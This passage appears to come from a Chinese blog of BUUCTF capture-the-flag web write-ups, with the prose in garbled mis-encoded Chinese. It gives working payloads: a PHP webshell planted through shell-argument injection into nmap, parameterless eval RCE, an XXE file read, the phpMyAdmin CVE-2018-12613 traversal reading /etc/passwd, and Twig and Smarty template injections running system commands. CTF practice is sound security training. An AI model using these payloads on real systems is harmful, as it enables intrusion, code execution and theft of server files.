<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?host=&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG test.php
</span></span><span class="line"><span class="cl">å› ä¸ºå…ˆç»è¿‡escapeshellarg()è¿™ä¸ªå‡½æ•°å¤„ç†ï¼Œå…ˆä¼šå¯¹å‰é¢çš„å•å¼•å·è¿›è¡Œè½¬ä¹‰ï¼Œç„¶åå†æŠŠå‰é¢å’Œåé¢çš„å†…å®¹ç”¨å•å¼•å·æ‹¬èµ·æ¥è¿æ¥ï¼Œå› ä¸ºåŸæœ¬è¿™ä¸ªå•å¼•å·å‰é¢æ²¡æœ‰å†…å®¹ï¼Œæ‰€ä»¥å‰é¢åªä¼šå¤šä¸€å¯¹å•å¼•å·
</span></span><span class="line"><span class="cl">?host=&#39;&#39;\&#39;&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG test.php&#39;
</span></span><span class="line"><span class="cl">ç„¶åå†ç»escapeshellcmd()å‡½æ•°å¤„ç†,escapeshellcmdå¯¹\ä»¥åŠæœ€åé‚£ä¸ªä¸é…å¯¹å„¿çš„å¼•å·è¿›è¡Œäº†è½¬ä¹‰,è¿˜ä¼šå¯¹è¿™äº›å­—ç¬¦è¿›è¡Œè½¬ä¹‰ï¼š
</span></span><span class="line"><span class="cl">?host=&#39;&#39;\\&#39;&#39; \&lt;\?php @eval\($_POST\[&#34;cmd&#34;\]\)\;\?\&gt; -oG test.php\&#39;
</span></span><span class="line"><span class="cl">æ‰€ä»¥æœ€åä¼šå¤šä¸€ä¸ªå•å¼•å·
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä½†å¦‚æœåŠ äº†å¼•å·ï¼Œä½†æ˜¯æœ€åä¸€ä¸ªå¼•å·å‰é¢æ²¡æœ‰åŠ ç©ºæ ¼ï¼Œé‚£æ ·æ–‡ä»¶ååé¢ä¼šå¤šåŒæ–œæ </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?host=&#39; &lt;?php @eval($_POST[&#34;cmd&#34;]);?&gt; -oG test.php&#39;
</span></span><span class="line"><span class="cl">&#39;&#39;\\&#39;&#39; \&lt;\?\php @eval\($_POST\[&#34;cmd&#34;\]\)\;\?\&gt; -oG test.php&#39;\\&#39;&#39;&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç©ºæ ¼ä½œç”¨å°±æ˜¯æŠŠæ–‡ä»¶ååé¢çš„åŒæ–œæ éš”å¼€</p>
<h2 id="gxyctf2019ç¦æ­¢å¥—å¨ƒ">[GXYCTF2019]ç¦æ­¢å¥—å¨ƒ
</h2><p>ç›®å½•æ‰«æå‘ç°.gitåé¢ç›®å½•æœ‰ä¸œè¥¿ï¼Œæ€€ç–‘gitæºç æ³„éœ²</p>
<p>githackä¸‹è½½æºç </p>
<p>ä¸‹è½½äº†index.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s2">&#34;flag.php&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;flagåœ¨å“ªé‡Œå‘¢ï¼Ÿ&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="s1">&#39;;&#39;</span> <span class="o">===</span> <span class="nx">preg_replace</span><span class="p">(</span><span class="s1">&#39;/[a-z,_]+\((?R)?\)/&#39;</span><span class="p">,</span> <span class="k">NULL</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/et|na|info|dec|bin|hex|oct|pi|log/i&#39;</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="c1">// echo $_GET[&#39;exp&#39;];
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;exp&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¿˜å·®ä¸€ç‚¹å“¦ï¼&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="k">die</span><span class="p">(</span><span class="s2">&#34;å†å¥½å¥½æƒ³æƒ³ï¼&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">die</span><span class="p">(</span><span class="s2">&#34;è¿˜æƒ³è¯»flagï¼Œè‡­å¼Ÿå¼Ÿï¼&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="c1">// highlight_file(__FILE__);
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">?&gt;</span><span class="err">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p><code>(?R)?</code> : <code>(?R)</code>ä»£è¡¨å½“å‰è¡¨è¾¾å¼ï¼Œå°±æ˜¯è¿™ä¸ª(/[a-z,_]+((?R)?)/)ï¼Œæ‰€ä»¥ä¼šä¸€ç›´é€’å½’ï¼Œ<code>?</code>è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–1ï¼ˆè‹¥æ˜¯<code>(?R)*</code>åˆ™è¡¨ç¤ºé€’å½’å½“å‰è¡¨è¾¾å¼0æ¬¡æˆ–å¤šæ¬¡ï¼Œä¾‹å¦‚å®ƒå¯ä»¥åŒ¹é…<code>a(b(c()d()))</code>ï¼‰</p>
<p>åªèƒ½æ— å‚rceäº†</p>
<p>æ„é€ payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">exp=highlight_file(next(array_reverse(scandir(pos(localeconv())))));
</span></span><span class="line"><span class="cl">highlight_file() å‡½æ•°å¯¹æ–‡ä»¶è¿›è¡Œè¯­æ³•é«˜äº®æ˜¾ç¤ºï¼Œæœ¬å‡½æ•°æ˜¯show_source() çš„åˆ«å
</span></span><span class="line"><span class="cl">next() è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ å’Œä¸‹ä¸€ä¸ªå…ƒç´ çš„å€¼ã€‚
</span></span><span class="line"><span class="cl">array_reverse() å‡½æ•°ä»¥ç›¸åçš„å…ƒç´ é¡ºåºè¿”å›æ•°ç»„ã€‚(ä¸»è¦æ˜¯èƒ½è¿”å›å€¼)
</span></span><span class="line"><span class="cl">scandir() å‡½æ•°è¿”å›æŒ‡å®šç›®å½•ä¸­çš„æ–‡ä»¶å’Œç›®å½•çš„æ•°ç»„ã€‚
</span></span><span class="line"><span class="cl">pos() è¾“å‡ºæ•°ç»„ä¸­çš„å½“å‰å…ƒç´ çš„å€¼ã€‚
</span></span><span class="line"><span class="cl">localeconv() å‡½æ•°è¿”å›ä¸€ä¸ªåŒ…å«æœ¬åœ°æ•°å­—åŠè´§å¸æ ¼å¼ä¿¡æ¯çš„æ•°ç»„ï¼Œè¯¥æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ å°±æ˜¯&#34;.&#34;ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p>loacleconv å‡½æ•°ä¼šå›ºå®šè¿”å›ä¸€ä¸ª . ç„¶åposå°†æˆ‘ä»¬è·å¾—çš„ .è¿”å›åˆ°æˆ‘ä»¬æ„é€ çš„ payload ä½¿å¾— scandirèƒ½å¤Ÿè¿”å›å½“å‰ç›®å½•ä¸‹çš„æ•°ç»„ï¼ˆæ¢å¥è¯è¯´ï¼Œå°±æ˜¯è¯»å‡ºå½“å‰ç›®å½•ä¸‹çš„æ–‡ä»¶ï¼‰array_reverse()ä»¥ç›¸åçš„é¡ºåºè¾“å‡ºï¼ˆç›®çš„æ˜¯ä»¥æ­£åºè¾“å‡ºæŸ¥è¯¢å‡ºæ¥çš„å†…å®¹ï¼‰ç„¶å next æå–ç¬¬äºŒä¸ªå…ƒç´ ï¼ˆå°†.è¿‡æ»¤å‡ºå»ï¼‰ï¼Œæœ€åç”¨highlight_file()ç»™æ˜¾ç¤ºå‡ºæ¥ã€‚</p>
<p>æˆ–è€…ç”¨session_idæ¥è·å¾—flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?exp=highlight_file(session_id(session_start()));
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250210105734729.png"
	width="1855"
	height="692"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250210105734729_hu1685593151879037383.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250210105734729_hu15466435477384431430.png 1024w"
	loading="lazy"
	
		alt="image-20250210105734729"
	
	
		class="gallery-image" 
		data-flex-grow="268"
		data-flex-basis="643px"
	
></p>
<p>æ·»åŠ cookieçš„phpsessidå€¼</p>
<h2 id="nctf2019fake-xml-cookbook">[NCTF2019]Fake XML cookbook
</h2><p>xxeæ¼æ´</p>
<p>ç›´æ¥ç§’äº†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE ANY[
</span></span><span class="line"><span class="cl">&lt;!ENTITY xxe SYSTEM &#34;file:///flag&#34;&gt;
</span></span><span class="line"><span class="cl">]&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸‹é¢usernameå¡«&amp;xxe;</p>
<h2 id="gwctf-2019æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“">[GWCTF 2019]æˆ‘æœ‰ä¸€ä¸ªæ•°æ®åº“
</h2><p>æˆ‘ç›®å½•æ‰«ææ‰«ä¸å‡ºæ¥åªèƒ½çœ‹åˆ«äººçš„äº†</p>
<p>æœ‰ä¸ªrobots.txt</p>
<p>æ²¡ä»€ä¹ˆç”¨</p>
<p>ä½†æ˜¯ä¹Ÿæ‰«åˆ°phpmyadmin</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/phpmyadmin/index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç‰ˆæœ¬ä¸º4.8.1ï¼Œæœ‰æœ‰ä¸ªcveæ¼æ´</p>
<p>æ¼æ´å¤ç°ï¼š<a class="link" href="https://blog.csdn.net/weixin_44037296/article/details/111039461"  target="_blank" rel="noopener"
    >phpMyAdmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å« CVE-2018-12613 æ¼æ´å¤ç°_phpmyadmin 4.8.1 è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´(cve-2018-12613) phpmyadm-CSDNåšå®¢</a></p>
<p>ç›´æ¥æŠ„payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>æœ‰å›æ˜¾</p>
<p>ç›´æ¥è¯»flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../flag
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bjdctf2020mark-loves-cat">[BJDCTF2020]Mark loves cat
</h2><p>bydæ‰«ä¸å‡ºæ¥æ²¡è®¾timeout,å¯ä»¥æŠŠçº¿ç¨‹è°ƒä½ï¼Œä½†æ˜¯å¤ªæ…¢äº†ï¼Œ-tè°ƒçº¿ç¨‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python dirsearch.py -e * -u http://ebc4f861-217c-4e5b-8de7-510518bd30be.node5.buuoj.cn:81/ -t 1 --timeout=2 -x 429
</span></span></code></pre></td></tr></table>
</div>
</div><p>å­˜åœ¨gitæ³„éœ²ï¼Œgithackä¸‹è½½æºç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">include</span> <span class="s1">&#39;flag.php&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nv">$yds</span> <span class="o">=</span> <span class="s2">&#34;dog&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$is</span> <span class="o">=</span> <span class="s2">&#34;cat&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$handsome</span> <span class="o">=</span> <span class="s1">&#39;yds&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$x</span> <span class="o">&amp;&amp;</span> <span class="nv">$x</span> <span class="o">!==</span> <span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">        <span class="k">exit</span><span class="p">(</span><span class="nv">$handsome</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="nv">$yds</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;flag&#39;</span>  <span class="o">||</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;flag&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;flag&#39;</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="k">exit</span><span class="p">(</span><span class="nv">$is</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;the flag is: &#34;</span><span class="o">.</span><span class="nv">$flag</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ä¸»è¦åˆ©ç”¨ç‚¹åœ¨è¿™é‡Œ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_POST</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">foreach</span><span class="p">(</span><span class="nv">$_GET</span> <span class="k">as</span> <span class="nv">$x</span> <span class="o">=&gt;</span> <span class="nv">$y</span><span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$$x</span> <span class="o">=</span> <span class="nv">$$y</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æˆ‘ä»¬è¦æ±‚æœ€åè¾“å‡ºflagï¼Œè¦ç»•è¿‡ä¸‰ä¸ªifå¾ˆå›°éš¾ï¼Œä½†æ˜¯å¦‚æœæŠŠexité‡Œé¢çš„å˜é‡è¦†ç›–ä¹Ÿèƒ½è¾“å‡ºflag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?yds=flag
</span></span><span class="line"><span class="cl">è¿™é‡Œgetä¼ å‚
</span></span><span class="line"><span class="cl">$x=yds;$y=flag
</span></span><span class="line"><span class="cl">$$x=$yds;$$y=$flag
</span></span><span class="line"><span class="cl">æ»¡è¶³ç¬¬äºŒä¸ªæ¡ä»¶
</span></span><span class="line"><span class="cl">è¿™æ ·exitå°±ä¼šè¿”å›$flagçš„å€¼
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?is=flag&amp;flag=flag
</span></span><span class="line"><span class="cl">æ»¡è¶³ç¬¬ä¸‰ä¸ªæ¡ä»¶
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">?handsome=flag&amp;flag=x&amp;x=flag
</span></span><span class="line"><span class="cl">è¿™é‡Œå› ä¸ºgetä¼ å‚ï¼Œ$x=$flag,flag=x,æ»¡è¶³ç¬¬ä¸€ä¸ªæ¡ä»¶
</span></span><span class="line"><span class="cl">æˆ–è€…ç›´æ¥?handsome=flag&amp;flag=handsome
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="wustctf2020æœ´å®æ— å">[WUSTCTF2020]æœ´å®æ— å
</h2><p>è¿™é‡Œintvalé‡Œé¢çš„æ•°è¦å°äº2020ä½†æ˜¯+1ä¹‹åè¦å¤§äº2021</p>
<p>ç”¨åˆ°ç§‘å­¦è®¡æ•°æ³•ï¼Œåˆšå¼€å§‹2e5ä¼šè¢«è§£ææˆ2ï¼Œä½†æ˜¯åŠ ä¸€ä¹‹åä¼šè¢«è§£æä¸º20001ï¼Œç¬¦åˆæ¡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">   <span class="nv">$md5</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;md5&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">   <span class="k">if</span> <span class="p">(</span><span class="nv">$md5</span><span class="o">==</span><span class="nx">md5</span><span class="p">(</span><span class="nv">$md5</span><span class="p">))</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¦æ±‚è·ŸåŸå­—ç¬¦ä¸²ç›¸åŒçš„MD5</p>
<p>åªæœ‰0e215962017</p>
<h2 id="bjdctf2020cookie-is-so-stable">[BJDCTF2020]Cookie is so stable
</h2><p>cookieæœ‰é—®é¢˜ï¼Œç»“åˆè¿™ä¸ªæ¯”èµ›ä¹‹å‰çš„é¢˜ç›®æ€€ç–‘ssti</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250213200047821.png"
	width="1840"
	height="524"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250213200047821_hu10634538342613399417.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250213200047821_hu11685162802597241356.png 1024w"
	loading="lazy"
	
		alt="image-20250213200047821"
	
	
		class="gallery-image" 
		data-flex-grow="351"
		data-flex-basis="842px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{7*&#39;7&#39;}}å›æ˜¾49è¯´æ˜æ˜¯twigæ¨¡æ¿æ³¨å…¥
</span></span></code></pre></td></tr></table>
</div>
</div><p>ç›´æ¥ä¸Špayload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{_self.env.registerUndefinedFilterCallback(&#34;exec&#34;)}}{{_self.env.getFilter(&#34;cat /flag&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="ciscn2019-åä¸œå—èµ›åŒºweb11">[CISCN2019 åä¸œå—èµ›åŒº]Web11
</h2><p>smartyæ³¨å…¥</p>
<p>ç›´æ¥xffå¤´ä¸Š{system(&lsquo;cat /flag&rsquo;)}</p>
<h2 id="mrctf2020ezpop">[MRCTF2020]Ezpop
</h2><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">protected</span>  <span class="nv">$var</span><span class="p">;</span>
